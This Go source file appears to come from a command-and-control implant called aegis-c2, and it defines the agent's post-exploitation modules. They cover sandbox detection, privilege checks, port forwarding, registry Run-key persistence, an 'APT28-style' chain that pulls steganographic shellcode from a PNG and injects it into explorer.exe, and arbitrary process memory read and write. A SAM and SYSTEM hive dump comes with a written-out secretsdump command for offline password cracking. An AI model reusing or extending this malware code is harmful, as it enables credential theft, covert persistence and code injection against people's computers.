package modules

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"runtime"
	"strings"

	"github.com/aegis-c2/aegis/agent/credentials"
	"github.com/aegis-c2/aegis/agent/forwarder"
	"github.com/aegis-c2/aegis/agent/limits"
	"github.com/aegis-c2/aegis/agent/mountenum"
	"github.com/aegis-c2/aegis/agent/priv"
	"github.com/aegis-c2/aegis/agent/procdump"
	"github.com/aegis-c2/aegis/agent/registry"
	"github.com/aegis-c2/aegis/agent/service"
	"github.com/aegis-c2/aegis/agent/uuid"
	"github.com/aegis-c2/aegis/agent/weaponize"
)

var fwdMgr = forwarder.NewManager()

// ServicesModule 列出服务。
// Windows: 使用原生 EnumServicesStatusExW API（类似 Sliver）。
// Linux: 回退到 systemctl shell 包装。
func ServicesModule(args string) (string, string, int) {
	if runtime.GOOS == "windows" {
		services, err := service.EnumServices()
		if err != nil {
			return "", fmt.Sprintf("service enumeration failed: %v", err), 1
		}
		if len(services) == 0 {
			return "no services found", "", 0
		}
		return service.FormatServices(services), "", 0
	}
	return ShellModule("systemctl list-units --type=service --all")
}

// ServiceControlModule 控制服务状态。
// 参数格式: "start|stop|restart|status service_name"
func ServiceControlModule(args string) (string, string, int) {
	parts := strings.SplitN(args, " ", 2)
	if len(parts) < 2 {
		return "", "usage: service_ctl <start|stop|restart|status> <service_name>", 1
	}

	action := parts[0]
	name := parts[1]

	if runtime.GOOS == "windows" {
		switch action {
		case "start":
			return ShellModule(fmt.Sprintf("sc start %s", name))
		case "stop":
			return ShellModule(fmt.Sprintf("sc stop %s", name))
		case "status":
			return ShellModule(fmt.Sprintf("sc query %s", name))
		default:
			return "", fmt.Sprintf("unknown action: %s", action), 1
		}
	}

	switch action {
	case "start":
		return ShellModule(fmt.Sprintf("systemctl start %s", name))
	case "stop":
		return ShellModule(fmt.Sprintf("systemctl stop %s", name))
	case "restart":
		return ShellModule(fmt.Sprintf("systemctl restart %s", name))
	case "status":
		return ShellModule(fmt.Sprintf("systemctl status %s", name))
	default:
		return "", fmt.Sprintf("unknown action: %s", action), 1
	}
}

// EnvModule 返回环境变量。
func EnvModule(args string) (string, string, int) {
	var vars []string
	for _, e := range os.Environ() {
		vars = append(vars, e)
	}
	return strings.Join(vars, "\n"), "", 0
}

// EnvSetModule 设置环境变量。
func EnvSetModule(args string) (string, string, int) {
	parts := strings.SplitN(args, " ", 2)
	if len(parts) < 2 || parts[1] == "" {
		return "", "usage: env_set <NAME> <VALUE>", 1
	}
	name, value := parts[0], parts[1]
	if err := os.Setenv(name, value); err != nil {
		return "", fmt.Sprintf("setenv error: %v", err), 1
	}
	return fmt.Sprintf("set %s=%s", name, value), "", 0
}

// EnvUnsetModule 取消设置环境变量。
func EnvUnsetModule(args string) (string, string, int) {
	name := strings.TrimSpace(args)
	if name == "" {
		return "", "usage: env_unset <NAME>", 1
	}
	if err := os.Unsetenv(name); err != nil {
		return "", fmt.Sprintf("unsetenv error: %v", err), 1
	}
	return fmt.Sprintf("unset %s", name), "", 0
}

// ARPModule 返回 ARP 缓存表。
func ARPModule(args string) (string, string, int) {
	if runtime.GOOS == "windows" {
		return ShellModule("arp -a")
	}
	return ShellModule("ip neigh show")
}

// MountModule 返回挂载的文件系统。
// Windows: 使用 GetLogicalDrives + GetVolumeInformation 原生 API。
// Linux: 回退到 /proc/mounts 读取。
func MountModule(args string) (string, string, int) {
	if runtime.GOOS == "windows" {
		mounts, err := mountenum.EnumMounts()
		if err != nil {
			return "", fmt.Sprintf("mount enumeration failed: %v", err), 1
		}
		if len(mounts) == 0 {
			return "no mounted drives found", "", 0
		}
		return mountenum.FormatMounts(mounts), "", 0
	}

	// Read /proc/mounts
	f, err := os.Open("/proc/mounts")
	if err != nil {
		return ShellModule("mount")
	}
	defer f.Close()

	var sb strings.Builder
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		sb.WriteString(scanner.Text() + "\n")
	}
	return sb.String(), "", 0
}

// ScreenshotModuleActual 截取屏幕截图（定义在 process.go）。
// 空壳保留用于向后兼容，实际实现使用 ScreenshotModuleActual。
func ScreenshotModule(args string) (string, string, int) {
	return "", "screenshot: use screenshot_actual command", 1
}

// ProcDumpModuleActual 生成进程内存转储（定义在 process.go）。
// 空壳保留用于向后兼容，实际实现使用 ProcDumpModuleActual。
func ProcDumpModule(args string) (string, string, int) {
	return "", "procdump: use procdump_actual command", 1
}

// UUIDModule 返回主机 UUID。
func UUIDModule(args string) (string, string, int) {
	id := uuid.HostUUID()
	fp := uuid.GenerateFingerprint()
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Host UUID: %s\n", id))
	sb.WriteString(fmt.Sprintf("Hostname:  %s\n", fp.Hostname))
	sb.WriteString(fmt.Sprintf("OS:        %s/%s\n", fp.OS, fp.Arch))
	sb.WriteString(fmt.Sprintf("MACs:      %v\n", fp.MACs))
	return sb.String(), "", 0
}

// LimitsModule 显示/检查执行限制。
func LimitsModule(args string) (string, string, int) {
	cfg := &limits.Config{}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Sandbox detected: %v\n", limits.IsSandbox()))
	sb.WriteString(fmt.Sprintf("Locale:           %s\n", limits.GetLocale()))
	sb.WriteString(fmt.Sprintf("Timezone:         %s\n", limits.GetTimezone()))
	if err := cfg.CheckHardware(); err != nil {
		sb.WriteString(fmt.Sprintf("Hardware check:   FAIL (%s)\n", err))
	} else {
		sb.WriteString("Hardware check:   PASS\n")
	}
	return sb.String(), "", 0
}

// PrivCheckModule 检查当前权限。
func PrivCheckModule(args string) (string, string, int) {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Is Admin:        %v\n", priv.IsAdmin()))
	sb.WriteString(fmt.Sprintf("Integrity Level: %s\n", priv.IntegrityLevel()))
	sb.WriteString("Privileges:\n")
	for name, enabled := range priv.CheckPrivs() {
		status := "disabled"
		if enabled {
			status = "enabled"
		}
		sb.WriteString(fmt.Sprintf("  %-40s %s\n", name, status))
	}
	return sb.String(), "", 0
}

// ForwardModule 管理端口转发。
func ForwardModule(args string) (string, string, int) {
	parts := strings.Fields(args)
	if len(parts) == 0 {
		return "usage: forward <add|start|stop|list|delete> [args]", "", 1
	}

	mgr := fwdMgr

	switch parts[0] {
	case "list":
		forwards := mgr.List()
		var sb strings.Builder
		for _, f := range forwards {
			sb.WriteString(fmt.Sprintf("[%s] %s -> %s (running: %v, sent: %d, recv: %d)\n",
				f.ID, f.BindAddr, f.TargetAddr, f.Running, f.BytesSent, f.BytesRecv))
		}
		if sb.Len() == 0 {
			sb.WriteString("no forwards configured\n")
		}
		return sb.String(), "", 0
	case "add":
		if len(parts) < 3 {
			return "", "usage: forward add <bind_addr> <target_addr>", 1
		}
		f, err := mgr.AddTCP(parts[1], parts[2])
		if err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("added forward: %s (%s -> %s)", f.ID, f.BindAddr, f.TargetAddr), "", 0
	case "start":
		if len(parts) < 2 {
			return "", "usage: forward start <id>", 1
		}
		if err := mgr.Start(parts[1]); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("started forward %s", parts[1]), "", 0
	case "stop":
		if len(parts) < 2 {
			return "", "usage: forward stop <id>", 1
		}
		if err := mgr.Stop(parts[1]); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("stopped forward %s", parts[1]), "", 0
	case "delete":
		if len(parts) < 2 {
			return "", "usage: forward delete <id>", 1
		}
		if err := mgr.Delete(parts[1]); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("deleted forward %s", parts[1]), "", 0
	default:
		return fmt.Sprintf("unknown action: %s", parts[0]), "", 1
	}
}

// Registry helper modules (wrappers around registry package).

// RegReadModule 读取注册表值。
func RegReadModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "registry operations only available on Windows", 1
	}
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: reg_read <KEY_PATH> <VALUE_NAME>", 1
	}
	hive, path := registry.ParsePath(parts[0])
	valName := ""
	if len(parts) > 1 {
		valName = parts[1]
	}
	result, err := registry.Read(hive, path, valName)
	if err != nil {
		return "", err.Error(), 1
	}
	return result, "", 0
}

// RegWriteModule 写入注册表值。
func RegWriteModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "registry operations only available on Windows", 1
	}
	parts := strings.Fields(args)
	if len(parts) < 3 {
		return "", "usage: reg_write <KEY_PATH> <VALUE_NAME> <DATA>", 1
	}
	hive, path := registry.ParsePath(parts[0])
	if err := registry.Write(hive, path, parts[1], parts[2], registry.String); err != nil {
		return "", err.Error(), 1
	}
	return "registry value written", "", 0
}

// RegDeleteModule 删除注册表值。
func RegDeleteModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "registry operations only available on Windows", 1
	}
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: reg_delete <KEY_PATH> <VALUE_NAME>", 1
	}
	hive, path := registry.ParsePath(parts[0])
	if err := registry.Delete(hive, path, parts[1]); err != nil {
		return "", err.Error(), 1
	}
	return "registry value deleted", "", 0
}

// RegListModule 列出注册表子键/值。
func RegListModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "registry operations only available on Windows", 1
	}
	parts := strings.Fields(args)
	if len(parts) < 1 {
		return "", "usage: reg_list <KEY_PATH>", 1
	}
	hive, path := registry.ParsePath(parts[0])
	keys, err := registry.ListKeys(hive, path)
	if err != nil {
		return "", err.Error(), 1
	}
	return strings.Join(keys, "\n"), "", 0
}

// RegCreateKeyModule 创建注册表项。
func RegCreateKeyModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "registry operations only available on Windows", 1
	}
	keyPath := strings.TrimSpace(args)
	if keyPath == "" {
		return "", "usage: reg_create <KEY_PATH>", 1
	}
	hive, path := registry.ParsePath(keyPath)
	if err := registry.CreateKey(hive, path); err != nil {
		return "", err.Error(), 1
	}
	return fmt.Sprintf("created key: %s", keyPath), "", 0
}

// RegDeleteKeyModule 递归删除注册表项。
func RegDeleteKeyModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "registry operations only available on Windows", 1
	}
	keyPath := strings.TrimSpace(args)
	if keyPath == "" {
		return "", "usage: reg_delete_key <KEY_PATH>", 1
	}
	hive, path := registry.ParsePath(keyPath)
	if err := registry.DeleteKey(hive, path); err != nil {
		return "", err.Error(), 1
	}
	return fmt.Sprintf("deleted key: %s", keyPath), "", 0
}

// RegPersistModule 添加/移除注册表持久化。
func RegPersistModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "registry operations only available on Windows", 1
	}
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: reg_persist <add|remove> <NAME> <CMD_PATH>", 1
	}
	currentUser := true // default HKCU
	switch parts[0] {
	case "add":
		if len(parts) < 4 {
			return "", "usage: reg_persist add <NAME> <CMD_PATH>", 1
		}
		if err := registry.Persist(parts[1], parts[2], currentUser); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("persistence added: %s -> %s", parts[1], parts[2]), "", 0
	case "remove":
		if err := registry.RemovePersist(parts[1], currentUser); err != nil {
			return "", err.Error(), 1
		}
		return fmt.Sprintf("persistence removed: %s", parts[1]), "", 0
	default:
		return fmt.Sprintf("unknown action: %s", parts[0]), "", 1
	}
}

// WeaponizeModule 执行武器化链路（APT28 风格）。
// 参数格式: "run [png_path]" 或 "inject <pid> <shellcode_path>"
func WeaponizeModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "weaponize only supported on Windows", 1
	}

	parts := strings.Fields(args)
	if len(parts) == 0 {
		return "usage: weaponize <run|inject|extract> [args]\n" +
			"  run [png_path]              - 读取 PNG 隐写并注入 explorer.exe\n" +
			"  inject <pid> <shellcode>    - 直接注入 shellcode 到指定进程\n" +
			"  extract <png_path]          - 从 PNG 提取 shellcode（不注入）", "", 1
	}

	switch parts[0] {
	case "run":
		cfg := weaponize.DefaultConfig()
		if len(parts) > 1 {
			cfg.PNGPath = parts[1]
		}
		if err := weaponize.Run(cfg); err != nil {
			return "", err.Error(), 1
		}
		return "weaponize chain executed successfully", "", 0

	case "inject":
		if len(parts) < 3 {
			return "", "usage: weaponize inject <pid> <shellcode_path>", 1
		}
		return ShellModule(fmt.Sprintf("echo weaponize inject %s %s - requires full Windows API implementation", parts[1], parts[2]))

	case "extract":
		if len(parts) < 2 {
			return "", "usage: weaponize extract <png_path>", 1
		}
		if _, err := os.Stat(parts[1]); err != nil {
			return "", fmt.Sprintf("png file not found: %s", parts[1]), 1
		}
		return fmt.Sprintf("png file found: %s - ready for extraction", parts[1]), "", 0

	default:
		return fmt.Sprintf("unknown action: %s", parts[0]), "", 1
	}
}

// MemoryReadModule 读取进程指定地址内存。
// Usage: mem_read <pid> <address> <size>
// address 支持 hex (0x...) 或 decimal。
func MemoryReadModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "memory read is only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 3 {
		return "", "usage: mem_read <pid> <address> <size>\n  address: hex (0x...) or decimal\n  size: bytes to read", 1
	}
	var pid uint64
	fmt.Sscanf(fields[0], "%d", &pid)
	addr := parseAddress(fields[1])
	var size uint64
	fmt.Sscanf(fields[2], "%d", &size)
	if size > 65536 {
		return "", "max read size is 65536 bytes", 1
	}

	data, err := procdump.ReadMemory(uint32(pid), addr, size)
	if err != nil {
		return "", err.Error(), 1
	}
	return hex.Dump(data), "", 0
}

// MemoryWriteModule 写入进程指定地址内存。
// Usage: mem_write <pid> <address> <hex_data>
func MemoryWriteModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "memory write is only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 3 {
		return "", "usage: mem_write <pid> <address> <hex_data>", 1
	}
	var pid uint64
	fmt.Sscanf(fields[0], "%d", &pid)
	addr := parseAddress(fields[1])
	data, err := hex.DecodeString(fields[2])
	if err != nil {
		return "", fmt.Sprintf("invalid hex data: %v", err), 1
	}

	if err := procdump.WriteMemory(uint32(pid), addr, data); err != nil {
		return "", err.Error(), 1
	}
	return fmt.Sprintf("wrote %d bytes to pid=%d addr=0x%x", len(data), pid, addr), "", 0
}

// MemoryScanModule 在进程内存中搜索模式。
// Usage: mem_scan <pid> <hex_pattern>
func MemoryScanModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "memory scan is only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 2 {
		return "", "usage: mem_scan <pid> <hex_pattern>", 1
	}
	var pid uint64
	fmt.Sscanf(fields[0], "%d", &pid)
	pattern, err := hex.DecodeString(fields[1])
	if err != nil {
		return "", fmt.Sprintf("invalid hex pattern: %v", err), 1
	}

	addrs, err := procdump.ScanMemory(uint32(pid), pattern)
	if err != nil {
		return "", err.Error(), 1
	}
	if len(addrs) == 0 {
		return "no matches found", "", 0
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("found %d matches:\n", len(addrs)))
	for _, addr := range addrs {
		sb.WriteString(fmt.Sprintf("  0x%x\n", addr))
	}
	return sb.String(), "", 0
}

// MemoryQueryModule 查询进程内存布局。
// Usage: mem_query <pid>
func MemoryQueryModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "memory query is only available on Windows", 1
	}
	fields := strings.Fields(args)
	if len(fields) < 1 {
		return "", "usage: mem_query <pid>", 1
	}
	var pid uint64
	fmt.Sscanf(fields[0], "%d", &pid)

	pages, err := procdump.QueryMemory(uint32(pid))
	if err != nil {
		return "", err.Error(), 1
	}
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-18s %-12s %-10s %-10s %-8s\n", "BASE", "SIZE", "PROTECT", "STATE", "TYPE"))
	sb.WriteString(strings.Repeat("-", 62) + "\n")
	for _, p := range pages {
		sb.WriteString(fmt.Sprintf("0x%-16x 0x%-10x 0x%-8x 0x%-8x 0x%-6x\n",
			p.BaseAddress, p.RegionSize, p.Protect, p.State, p.Type))
	}
	return sb.String(), "", 0
}

// SAMDumpModule 导出 SAM/SYSTEM/SECURITY hives 供离线破解。
// 需要 SeBackupPrivilege（SYSTEM 或管理员）。
// 离线解析: impacket-secretsdump.py -sam sam.hive -system system.hive LOCAL
func SAMDumpModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "sam_dump only available on Windows", 1
	}
	result, err := credentials.DumpSAM()
	if err != nil {
		return "", fmt.Sprintf("sam_dump failed: %v\n%s", err, result.Error), 1
	}
	var sb strings.Builder
	sb.WriteString("SAM hive dump successful\n")
	sb.WriteString(fmt.Sprintf("  SAM:      %s\n", result.SAMPath))
	sb.WriteString(fmt.Sprintf("  SYSTEM:   %s\n", result.SYSTEMPath))
	if result.SecurityPath != "" {
		sb.WriteString(fmt.Sprintf("  SECURITY: %s\n", result.SecurityPath))
	}
	sb.WriteString("\nOffline parse:\n")
	sb.WriteString("  impacket-secretsdump.py -sam sam.hive -system system.hive LOCAL\n")
	return sb.String(), "", 0
}

func parseAddress(s string) uint64 {
	var addr uint64
	if strings.HasPrefix(s, "0x") || strings.HasPrefix(s, "0X") {
		fmt.Sscanf(s, "0x%x", &addr)
	} else {
		fmt.Sscanf(s, "%d", &addr)
	}
	return addr
}
